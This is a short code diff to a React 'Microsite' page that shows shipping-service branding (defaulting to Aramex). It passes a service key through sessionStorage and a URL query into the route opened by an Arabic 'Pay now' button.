@@ -51,6 +51,7 @@ const Microsite = () => {
   const serviceName = payload.service_name || payload.chalet_name;
   const serviceKey = payload.service_key || 'aramex';
   const serviceBranding = getServiceBranding(serviceKey);
+  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
   
   // Update URL to include service information for better SEO
   React.useEffect(() => {
@@ -60,6 +61,12 @@ const Microsite = () => {
       window.history.replaceState({}, '', currentUrl.toString());
     }
   }, [isShipping, serviceKey]);
+
+  React.useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   // Get service description from gccShippingServices
   const allServices = Object.values(gccShippingServices).flat();
@@ -268,7 +275,7 @@ const Microsite = () => {
               <Button
                 size="lg"
                 className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
-                onClick={() => navigate(`/pay/${link.id}/track`)}
+                onClick={() => navigate(`/pay/${link.id}/track${serviceQuery}`)}
               >
                 <CreditCard className="w-6 h-6 ml-3" />
                 <span>ادفع الآن</span>
